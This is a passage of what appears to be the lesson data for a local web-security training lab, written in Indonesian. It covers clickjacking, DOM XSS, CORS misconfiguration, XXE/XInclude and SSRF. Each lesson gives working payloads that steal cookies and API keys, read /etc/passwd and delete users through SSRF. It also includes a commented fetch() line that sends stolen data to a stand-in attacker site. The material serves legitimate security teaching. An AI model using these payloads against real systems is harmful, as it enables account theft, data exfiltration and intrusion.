            "goal": "Gabungkan Clickjacking dengan parameter URL untuk memanipulasi target transfer dana sebelum menipu pengguna mengklik tombol konfirmasi.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Bahaya Parameter URL pada Clickjacking</h3>
<p>Dalam serangan Clickjacking sederhana, penyerang hanya mengandalkan kondisi formulir yang sudah ada. Namun, hal ini menjadi sangat mematikan jika halaman target memungkinkan parameter dari URL (GET parameters) untuk mengisi formulir secara otomatis (<i>pre-fill</i>).</p>
<p>Pada lab ini, halaman target berfungsi untuk mengonfirmasi transfer dana sebesar $10,000. Halaman ini menerima parameter URL <code>?to=...</code> yang menentukan siapa akun penerimanya.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Identifikasi fungsionalitas parameter dengan membuka URL target: <code>/lab/clickjacking/expert/transfer</code>. Secara default, dana akan dikirim ke "user_default".</li>
<li>Ubah URL di browser menjadi <code>/lab/clickjacking/expert/transfer?to=attacker</code>. Anda akan melihat bahwa nama target di halaman web otomatis berubah menjadi "attacker".</li>
<li>Buat file HTML <i>exploit</i> seperti level-level sebelumnya.</li>
<li>Pada tag <code>&lt;iframe&gt;</code>, arahkan atribut <code>src</code> ke URL target <b>yang sudah disisipi parameter spesifik milik penyerang</b> (yaitu <code>?to=attacker</code>).</li>
<li>Sesuaikan posisi CSS agar tombol decoy pas dengan tombol konfirmasi, lalu buat iframe menjadi transparan.</li>
<li>Ketika korban tertipu dan mengklik tombol, transfer dana akan langsung mengalir ke akun penyerang.</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Payload HTML Penyerang</h3>
<pre>&lt;html&gt;
&lt;head&gt;
    &lt;style&gt;
        iframe {
            position: absolute; width: 800px; height: 600px; 
            opacity: 0.3; /* Atur ke 0.0001 */ z-index: 2; 
            top: -160px; left: -60px; /* Selaraskan ini */
        }
        .decoy-button {
            position: absolute; z-index: 1; top: 250px; left: 300px;
            padding: 20px 40px; background-color: purple; color: white;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="decoy-button"&gt;KLAIM SALDO GRATIS&lt;/div&gt;
    &lt;!-- Sisipkan parameter target penyerang pada atribut src --&gt;
    &lt;iframe src="http://127.0.0.1:5000/lab/clickjacking/expert/transfer?to=attacker"&gt;&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
            """
        }
    },
    "dom-based": {
        "apprentice": {
            "title": "DOM XSS via document.write / innerHTML",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Eksploitasi kerentanan DOM XSS dengan menyisipkan tag gambar berserta event handler <code>onerror</code> untuk memicu fungsi <code>alert()</code>.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar DOM XSS</h3>
<p><b>Document Object Model (DOM)</b> adalah representasi hierarkis dari elemen-elemen halaman web yang dapat dimanipulasi oleh JavaScript. DOM XSS terjadi ketika aplikasi JavaScript mengambil data dari <b>sumber (source)</b> yang dapat dikendalikan penyerang (seperti URL) dan meneruskannya secara tidak aman ke <b>eksekutor (sink)</b> yang mengeksekusi kode tersebut.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Analisis Kode (Source & Sink)</h3>
<p>Pada lab ini, halaman memiliki kolom pencarian. Jika Anda melihat <i>source code</i> HTML/JavaScript-nya (Klik Kanan -> Inspect -> Elements), Anda akan menemukan kode berikut:</p>
<pre>var query = new URLSearchParams(window.location.search).get('q');
if (query) {
    document.getElementById('search-result').innerHTML = query;
}</pre>
<p><b>Source:</b> <code>window.location.search</code> (Mengambil parameter <code>?q=...</code> dari URL).<br>
<b>Sink:</b> <code>innerHTML</code> (Menyisipkan string langsung ke dalam HTML tanpa sanitasi).</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Masukkan kata acak di kolom pencarian, misal: <code>test</code>, dan perhatikan URL berubah menjadi <code>?q=test</code>.</li>
<li>Karena browser modern biasanya memblokir tag <code>&lt;script&gt;</code> yang disisipkan melalui <code>innerHTML</code>, kita harus menggunakan vektor alternatif seperti event handler pada tag HTML (misal: <code>&lt;img&gt;</code> atau <code>&lt;svg&gt;</code>).</li>
<li>Ubah URL di address bar browser Anda (atau masukkan ke kolom input) dengan payload berikut:</li>
</ol>
<pre>&lt;img src="x" onerror="alert(document.domain)"&gt;</pre>
<p><b>Penjelasan Payload:</b> Browser mencoba memuat gambar dari sumber "x" (yang tidak ada). Karena gagal, event <code>onerror</code> langsung terpicu, dan JavaScript kita (<code>alert</code>) dieksekusi oleh browser secara instan.</p>
            """
        },
        "practitioner": {
            "title": "DOM XSS via location.hash & eval()",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Bypass konteks string pada fungsi <code>eval()</code> JavaScript menggunakan manipulasi fragmen URL (hash) untuk mengeksekusi kode berbahaya.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Bahaya Fungsi eval()</h3>
<p>Fungsi <code>eval()</code> mengevaluasi string apa pun sebagai kode JavaScript. Jika input pengguna masuk ke dalam <code>eval()</code>, ini sangat berbahaya dan merupakan salah satu <i>sink</i> paling kritis dalam keamanan web.</p>
<p>Pada lab ini, pengaturan tema warna (Theme) dibaca dari <b>URL Hash</b> (bagian URL setelah tanda <code>#</code>). Perhatikan bahwa fragment hash tidak pernah dikirim ke server backend saat halaman dimuat.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Analisis Kode</h3>
<p>Coba periksa JavaScript di halaman lab:</p>
<pre>var hash = decodeURIComponent(window.location.hash.substring(1));
if (hash) {
    eval("var theme = '" + hash + "';");
    // ... setup warna tema
}</pre>
<p>Input kita dari URL hash dimasukkan tepat di tengah-tengah tanda kutip: <code>var theme = '[INPUT KITA]';</code></p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Tugas kita adalah "melarikan diri" (<i>break out</i>) dari deklarasi string JavaScript tersebut.</li>
<li>Kita perlu memasukkan tanda kutip penutup <code>'</code>, menambahkan titik koma <code>;</code> untuk mengakhiri baris kode pertama, menyisipkan perintah <code>alert()</code>, dan mengomentari sisa kode yang ada <code>//</code>.</li>
<li>Susun <i>payload</i> kita: <code>'; alert(document.domain); //</code></li>
<li>Tambahkan <i>payload</i> tersebut ke akhir URL Anda, sehingga terlihat seperti ini:<br>
<code>.../lab/dom-based/practitioner/theme#'; alert(document.domain); //</code></li>
<li>Tekan Enter / muat ulang halaman.</li>
</ol>
<p><b>Hasil Evaluasi Sink:</b> Fungsi eval akan membaca string tersebut sebagai:<br>
<code>var theme = ''; alert(document.domain); //';</code><br>
Skrip terpotong dengan aman dan <code>alert()</code> dieksekusi.</p>
            """
        },
        "expert": {
            "title": "DOM-Based Open Redirection",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Eksploitasi fitur pengalihan URL dinamis untuk mengeksekusi JavaScript melalui pseudo-protocol <code>javascript:</code>.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Apa itu DOM Open Redirection?</h3>
<p>DOM-Based Open Redirection terjadi ketika skrip membaca URL yang disediakan oleh penyerang (dari <i>source</i>) dan menggunakannya untuk mengubah lokasi halaman (<i>sink</i> seperti <code>window.location</code> atau atribut <code>href</code> pada elemen <code>&lt;a&gt;</code>).</p>
<p>Meskipun tujuan utamanya biasanya adalah <i>phishing</i> (mengarahkan korban ke situs palsu), ini juga bisa di eskalasi menjadi DOM XSS jika kita menggunakan pseudo-protokol.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Analisis Kode</h3>
<p>Halaman ini memiliki fitur "Kembali ke Belanja" yang membaca parameter URL <code>?returnUrl=...</code>.</p>
<pre>var returnUrl = new URLSearchParams(window.location.search).get('returnUrl');
if (returnUrl) {
    document.getElementById('back-link').setAttribute('href', returnUrl);
}</pre>
<p>Skrip secara dinamis menetapkan atribut <code>href</code> dari tag <code>&lt;a&gt;</code> berdasarkan input kita.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab. Anda mungkin melihat parameter <code>?returnUrl=/</code> di Address Bar Anda.</li>
<li>Jika Anda mengubahnya menjadi <code>?returnUrl=https://google.com</code>, tombol tersebut akan mengarah ke Google (ini adalah Open Redirection standar).</li>
<li>Untuk mengeskalasinya menjadi XSS, ubah parameter tersebut menggunakan pseudo-protocol JavaScript:</li>
<li>Ganti URL menjadi: <code>?returnUrl=javascript:alert(document.cookie)</code></li>
<li>Klik tombol "Kembali ke Belanja". Bukannya berpindah halaman, browser justru akan mengeksekusi skrip Anda!</li>
</ol>
            """
        }
    },
    "cors": {
        "apprentice": {
            "title": "CORS Misconfiguration: Trusting All Origins",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Eksploitasi konfigurasi CORS yang memantulkan sembarang header Origin. Buat file HTML lokal untuk mencuri data API Key rahasia Anda sendiri dari endpoint <code>/api/account</code>.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar CORS</h3>
<p><b>CORS (Cross-Origin Resource Sharing)</b> adalah mekanisme browser yang memungkinkan halaman web dari satu domain (origin) mengakses sumber daya (resource) dari domain lain. Tanpa CORS, browser menerapkan <i>Same-Origin Policy (SOP)</i> yang memblokir akses data lintas domain demi keamanan.</p>
<p>Kerentanan terjadi ketika server memberikan izin CORS yang terlalu longgar. Jika server merespons dengan header <code>Access-Control-Allow-Origin: *</code>, ia tidak bisa digunakan bersama <code>Access-Control-Allow-Credentials: true</code> (untuk mengirim cookie/sesi). Sebagai jalan pintas yang buruk, developer sering membaca header <code>Origin</code> dari request pengguna, lalu menyalinnya langsung ke dalam response.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Analisis Endpoint</h3>
<p>Buka halaman lab ini. Anda akan melihat informasi sensitif (API Key) dan keterangan bahwa data tersebut diambil dari endpoint <code>/lab/cors/apprentice/api/account</code>.</p>
<p>Kirimkan request ke endpoint tersebut menggunakan Burp Suite Repeater, lalu tambahkan header buatan Anda: <code>Origin: http://situs-penyerang.com</code>.</p>
<p>Jika Anda melihat respons server memantulkan origin tersebut beserta izin kredensial, maka endpoint tersebut rentan:</p>
<pre>Access-Control-Allow-Origin: http://situs-penyerang.com
Access-Control-Allow-Credentials: true</pre>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Pembuatan Payload Eksploitasi</h3>
<p>Sebagai penyerang, kita bisa membuat halaman web berbahaya yang menggunakan JavaScript (<code>fetch</code> atau <code>XMLHttpRequest</code>) untuk memanggil API target dan membaca hasilnya.</p>
<p>Buat file <code>exploit.html</code> di komputer Anda dengan kode berikut. Buka file tersebut di browser (saat Anda masih login di lab):</p>
<pre>&lt;html&gt;
&lt;body&gt;
    &lt;h2&gt;Mencuri API Key...&lt;/h2&gt;
    &lt;p id="stolen-data" style="color: red; font-weight: bold;"&gt;&lt;/p&gt;
    
    &lt;script&gt;
        fetch("http://127.0.0.1:5000/lab/cors/apprentice/api/account", {
            method: "GET",
            credentials: "include" // Wajib agar session cookie ikut terkirim
        })
        .then(response =&gt; response.text())
        .then(data =&gt; {
            document.getElementById('stolen-data').innerText = "Data Dicuri: " + data;
            // Dalam serangan nyata, data ini akan dikirim ke server penyerang
            // fetch("http://situs-penyerang.com/log?data=" + btoa(data));
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
            """
        },
        "practitioner": {
            "title": "CORS Misconfiguration: Trusting Null Origin",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Bypass pembatasan CORS dengan memanfaatkan <i>null origin</i> melalui tag iframe bersandbox untuk mencuri API Key.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Kesalahan Konfigurasi "null" Origin</h3>
<p>Terkadang, developer memblokir origin dari domain asing (seperti <code>http://attacker.com</code>), tetapi mereka secara eksplisit mengizinkan origin <code>null</code>.</p>
<p>Origin <code>null</code> biasanya dikirim oleh browser dalam situasi tertentu, misalnya saat memuat file HTML lokal secara langsung (file://), atau saat halaman dirender dari dalam iframe bersandbox (<i>sandboxed iframe</i>).</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Analisis Endpoint</h3>
<p>Gunakan Burp Suite untuk menguji endpoint <code>/lab/cors/practitioner/api/account</code>.</p>
<p>Jika Anda mengirim <code>Origin: http://attacker.com</code>, server tidak memantulkannya. Namun, jika Anda mengirim <code>Origin: null</code>, server akan merespons:</p>
<pre>Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true</pre>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Pembuatan Payload (Sandboxed Iframe)</h3>
<p>Untuk memaksa browser kita mengirimkan header <code>Origin: null</code> saat menjalankan eksploitasi, kita harus membungkus kode JavaScript berbahaya kita ke dalam iframe dengan atribut <code>sandbox="allow-scripts"</code>.</p>
<p>Buat file <code>exploit.html</code> dengan kode ini dan buka di browser:</p>
<pre>&lt;html&gt;
&lt;body&gt;
    &lt;h2&gt;Mengeksploitasi Null Origin...&lt;/h2&gt;
    &lt;iframe sandbox="allow-scripts" srcdoc="
        &lt;script&gt;
            fetch('http://127.0.0.1:5000/lab/cors/practitioner/api/account', {
                credentials: 'include'
            })
            .then(r =&gt; r.text())
            .then(data =&gt; {
                alert('Data Dicuri dari Origin Null: ' + data);
            });
        &lt;/script&gt;
    "&gt;&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
            """
        },
        "expert": {
            "title": "CORS Misconfiguration: Weak Regex Pattern",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Bypass validasi URL CORS yang cacat dengan teknik modifikasi domain (memanipulasi string Origin).",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Cacat Logika pada Regex CORS</h3>
<p>Developer sering memvalidasi header Origin menggunakan metode pencarian string sederhana seperti <code>startsWith()</code> atau <code>endsWith()</code> tanpa memperhitungkan struktur URL sepenuhnya.</p>
<p>Misalnya, jika server memvalidasi: <i>"Izinkan jika origin dimulai dengan <code>http://127.0.0.1:5000</code>"</i>, maka penyerang bisa mendaftarkan domain bernama <code>http://127.0.0.1:5000.attacker.com</code> dan server akan menganggapnya valid!</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Eksploitasi & Verifikasi dengan Burp</h3>
<p>Dalam lingkungan lab lokal, sulit untuk benar-benar membeli domain bernama <code>127.0.0.1:5000.attacker.com</code>. Namun, Anda dapat membuktikan kerentanan ini dengan memanipulasi request menggunakan Burp Suite.</p>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka Burp Suite Repeater dan tujukan ke <code>/lab/cors/expert/api/account</code>.</li>
<li>Tambahkan header: <code>Origin: http://127.0.0.1:5000.situs-penyerang.com</code>.</li>
<li>Kirim request. Anda akan melihat bahwa server tertipu dan mengizinkan origin tersebut karena bagian depannya "cocok" dengan pola yang divalidasi.</li>
</ol>
<pre>Access-Control-Allow-Origin: http://127.0.0.1:5000.situs-penyerang.com
Access-Control-Allow-Credentials: true</pre>
<p>Dalam skenario dunia nyata, penyerang cukup menghosting file HTML <code>fetch()</code> standar (seperti pada level Apprentice) di domain tersebut, dan browser korban akan mengeksekusinya tanpa diblokir oleh SOP.</p>
            """
        }
    },
    "xxe": {
        "apprentice": {
            "title": "Exploiting XXE untuk Mengambil File Sistem",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Eksploitasi fitur Cek Stok yang memproses input XML untuk membaca isi file <code>/etc/passwd</code> (Linux) atau <code>C:/Windows/win.ini</code> (Windows) dari server.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar XXE</h3>
<p><b>XML External Entity (XXE)</b> adalah kerentanan yang terjadi ketika aplikasi memproses input XML yang mengandung referensi ke <i>external entity</i> tanpa pengamanan yang memadai. Penyerang dapat mendefinisikan <i>entity</i> kustom yang memaksa parser XML server untuk membaca file lokal, berinteraksi dengan sistem internal, atau mengeksekusi SSRF.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Analisis Titik Lemah (Vulnerability)</h3>
<p>Fitur "Cek Stok" pada lab ini mengirimkan data dalam format XML ke server. Backend menggunakan parser <code>lxml</code> dengan konfigurasi <code>resolve_entities=True</code>, yang secara otomatis akan mengeksekusi <i>external entity</i> apa pun yang dideklarasikan di dalam <code>&lt;!DOCTYPE&gt;</code> (DTD).</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Eksploitasi menggunakan Burp Suite</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab, klik tombol <b>Cek Stok</b> untuk menangkap <i>request</i> POST di Burp Suite.</li>
<li>Kirim <i>request</i> tersebut ke <b>Repeater</b>. Anda akan melihat body XML seperti ini:<br>
<code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br>&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/stockCheck&gt;</code></li>
<li>Sisipkan deklarasi DOCTYPE di bawah baris <code>&lt;?xml...&gt;</code> yang mendefinisikan entity bernama <code>xxe</code> untuk memanggil file sistem.</li>
<li>Panggil entity <code>&amp;xxe;</code> tersebut di dalam elemen <code>&lt;productId&gt;</code>.</li>
</ol>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload XML:</h3>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</pre>
<p><i>(Jika Anda menggunakan Windows untuk hosting lab, ganti <code>file:///etc/passwd</code> menjadi <code>file:///C:/Windows/win.ini</code>)</i></p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">4. Alternatif Eksploitasi menggunakan cURL</h3>
<p>Bagi Anda yang menyukai CLI, serangan ini dapat dengan mudah dieksekusi melalui terminal:</p>
<pre>curl -X POST http://127.0.0.1:5000/lab/xxe/apprentice/stock \
-H "Content-Type: application/xml" \
-d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;'</pre>
            """
        },
        "practitioner": {
            "title": "Exploiting XXE untuk Melakukan SSRF",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Gunakan XXE untuk melakukan <i>Server-Side Request Forgery (SSRF)</i>. Paksa server untuk mengakses endpoint internal rahasia <code>http://127.0.0.1:5000/lab/xxe/internal/secret</code> yang tidak bisa diakses dari luar.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Konsep XXE to SSRF</h3>
<p>Selain membaca file lokal (menggunakan skema <code>file://</code>), entitas eksternal XML juga dapat memanggil URL berbasis jaringan (menggunakan skema <code>http://</code>). Ini memungkinkan kita memaksa server bertindak sebagai <i>proxy</i> untuk menyerang sistem internal yang tidak terpapar ke internet, teknik ini dikenal sebagai SSRF.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Eksploitasi menggunakan Burp Suite / cURL</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Jika Anda mencoba membuka <code>/lab/xxe/internal/secret</code> melalui browser secara langsung, Anda mungkin mendapatkan pesan rahasia, namun dalam skenario dunia nyata, endpoint ini biasanya diblokir oleh <i>firewall</i> atau berada di segmen jaringan yang berbeda (misalnya AWS Metadata API <code>169.254.169.254</code>).</li>
<li>Pada lab ini, kita akan memaksa parser XML server untuk melakukan request HTTP (GET) ke endpoint rahasia tersebut dan memantulkan hasilnya ke layar kita.</li>
<li>Gunakan metode penangkapan <i>request</i> yang sama dengan level Apprentice.</li>
<li>Ganti skema <code>file://</code> pada definisi entitas dengan URL target SSRF.</li>
</ol>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload XML:</h3>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:5000/lab/xxe/internal/secret"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</pre>
<p>Server akan mengambil data dari URL internal tersebut, dan menampilkannya sebagai bagian dari respons "Stok untuk produk ...".</p>
            """
        },
        "expert": {
            "title": "Exploiting XInclude untuk By-pass Form Data Biasa",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Eksploitasi fitur Cek Stok menggunakan serangan <b>XInclude</b> untuk membaca file sistem (<code>/etc/passwd</code>). Berbeda dengan level sebelumnya, form ini <b>tidak menerima input XML</b> dari pengguna, melainkan POST data biasa.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Kapan XInclude Digunakan?</h3>
<p>Banyak aplikasi tidak menerima input XML secara langsung dari klien (misalnya menerima JSON atau parameter form URL-encoded biasa <code>productId=1</code>). Namun di sisi <i>backend</i>, aplikasi mengambil input tersebut dan memasukkannya ke dalam dokumen XML yang mereka buat sendiri untuk diproses oleh SOAP/XML API internal.</p>
<p>Karena Anda tidak dapat mendefinisikan <code>&lt;!DOCTYPE&gt;</code> secara keseluruhan, serangan XXE klasik tidak akan bekerja. Solusinya adalah menggunakan <b>XInclude</b>, fitur spesifikasi XML yang memungkinkan kita memuat sub-dokumen atau teks mentah.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Eksploitasi XInclude</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab. Perhatikan bahwa klik tombol <b>Cek Stok</b> mengirimkan form standar (URL-encoded) dengan body: <code>productId=1</code>.</li>
<li>Tangkap <i>request</i> di Burp Suite.</li>
<li>Ganti nilai <code>1</code> dengan sintaks tag XML XInclude yang memanggil namespace spesifik <code>xmlns:xi</code> dan menyuruh parser menyertakan konten file sebagai teks (<code>parse="text"</code>).</li>
<li>Kirim request, dan hasil bacaan file akan muncul di layar.</li>
</ol>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload XInclude:</h3>
<pre>productId=&lt;xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/&gt;</pre>
<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Alternatif menggunakan HTTPie atau cURL:</h3>
<pre>curl -X POST http://127.0.0.1:5000/lab/xxe/expert/stock \
-d 'productId=&lt;xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/&gt;'</pre>
            """
        }
    },
    "ssrf": {
        "apprentice": {
            "title": "Basic SSRF against the local server",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Ubah parameter URL API stok untuk mengakses panel admin lokal dan menghapus pengguna bernama <code>carlos</code>.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar SSRF</h3>
<p><b>Server-side request forgery (SSRF)</b> adalah kerentanan keamanan web yang memungkinkan penyerang memaksa aplikasi sisi server untuk membuat permintaan HTTP ke domain sembarang yang dipilih penyerang. Pada umumnya, kerentanan ini digunakan untuk menargetkan sistem internal yang bersembunyi di balik <i>firewall</i> perusahaan dan tidak dapat diakses langsung dari jaringan luar.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Browser Web:</b> Chrome, Firefox, atau Edge untuk navigasi dasar.</li>
    <li><b>Burp Suite (Proxy & Repeater):</b> Untuk menangkap (<i>intercept</i>) dan memodifikasi <i>request</i> POST sebelum dikirim ke server.</li>
    <li><b>cURL (Opsional):</b> Jika Anda lebih menyukai eksekusi melalui Command Line Interface (CLI).</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Analisis Kerentanan</h3>
<p>Fitur "Cek Stok" pada lab ini bekerja dengan cara mengambil URL dari input pengguna (parameter <code>stockApi</code>), lalu server <i>backend</i> akan melakukan permintaan HTTP GET ke URL tersebut. Karena tidak ada validasi, kita bisa memerintahkan server untuk mengakses dirinya sendiri (<code>localhost</code> atau <code>127.0.0.1</code>) dan mengakses halaman administratif yang seharusnya tertutup untuk publik.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">4. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab dan klik tombol <b>Cek Stok</b>.</li>
<li>Gunakan Burp Suite untuk menangkap <i>request</i> POST yang dikirim ke <code>/lab/ssrf/apprentice/stock</code>.</li>
<li>Kirim <i>request</i> tersebut ke <b>Repeater</b>.</li>
<li>Ubah parameter <code>stockApi</code> yang awalnya menunjuk ke API normal menjadi URL Panel Admin lokal: <code>http://127.0.0.1:5000/lab/ssrf/admin</code>.</li>
<li>Kirim <i>request</i>. Anda akan melihat antarmuka Panel Admin muncul di respons Burp Suite, yang memiliki tautan untuk menghapus pengguna.</li>
<li>Ganti kembali nilai parameter <code>stockApi</code> untuk langsung menembak <i>endpoint</i> penghapusan:</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload (URL Encoded form):</h3>
<pre>stockApi=http%3A%2F%2F127.0.0.1%3A5000%2Flab%2Fssrf%2Fadmin%2Fdelete%3Fusername%3Dcarlos</pre>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Alternatif menggunakan cURL:</h3>
<pre>curl -X POST http://127.0.0.1:5000/lab/ssrf/apprentice/stock \
-d "stockApi=http://127.0.0.1:5000/lab/ssrf/admin/delete?username=carlos"</pre>
            """
        },
        "practitioner": {
            "title": "SSRF dengan Bypass Filter Blacklist",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Bypass filter <i>blacklist</i> server yang memblokir alamat IP lokal standar. Hapus pengguna <code>carlos</code> melalui panel admin.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Konsep Bypass Blacklist</h3>
<p>Developer sering memitigasi SSRF dengan membuat <i>blacklist</i> (daftar hitam) untuk memblokir string seperti <code>127.0.0.1</code> atau <code>localhost</code>. Namun, alamat IP dapat direpresentasikan dalam berbagai format yang masih bisa dikenali oleh sistem operasi, sehingga filter berbasis pencocokan string sederhana dapat dengan mudah dikelabui.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite:</b> Untuk memodifikasi parameter URL secara leluasa.</li>
    <li><b>IP Obfuscator:</b> Konverter IP (seperti pengubah IP ke bentuk desimal/integer, atau format ringkas).</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Tangkap <i>request</i> Cek Stok menggunakan Burp Suite dan kirim ke Repeater.</li>
<li>Jika Anda mencoba <i>payload</i> dari level sebelumnya (<code>http://127.0.0.1:5000/...</code>), server akan menolak dengan pesan "Alamat host dilarang".</li>
<li>Gunakan representasi alternatif dari 127.0.0.1. Beberapa variasi yang bisa menembus filter string antara lain:</li>
    <ul class="list-disc pl-5 mt-2">
        <li><code>127.1</code> (Menghilangkan angka nol)</li>
        <li><code>2130706433</code> (Format Desimal / Integer IP)</li>
        <li><code>0x7F000001</code> (Format Hexadesimal)</li>
    </ul>
<li>Ubah parameter <code>stockApi</code> Anda dengan salah satu format di atas, dikombinasikan dengan <i>port</i> dan rute admin.</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload:</h3>
<pre>stockApi=http://127.1:5000/lab/ssrf/admin/delete?username=carlos</pre>
            """
        },
        "expert": {
            "title": "SSRF dengan Bypass Filter Whitelist (Open Redirect)",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Bypass filter <i>whitelist</i> yang sangat ketat dengan memanipulasi kerentanan Open Redirect di dalam domain yang diizinkan untuk mengakses panel admin.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Konsep Bypass Whitelist melalui Open Redirect</h3>
<p>Dalam sistem yang menggunakan <i>whitelist</i> (daftar putih), server hanya akan mengizinkan URL yang diawali dengan string atau domain tertentu (misalnya, hanya mengizinkan URL yang dimulai dengan <code>http://127.0.0.1:5000/lab/ssrf/expert/product</code>).</p>
<p>Jika kita menemukan kerentanan <b>Open Redirect</b> pada direktori yang diizinkan tersebut, kita dapat memenuhi syarat <i>whitelist</i>, dan membiarkan server backend secara otomatis mengikuti arah <i>redirect</i> HTTP (Status 30x) menuju URL target internal kita.</p>

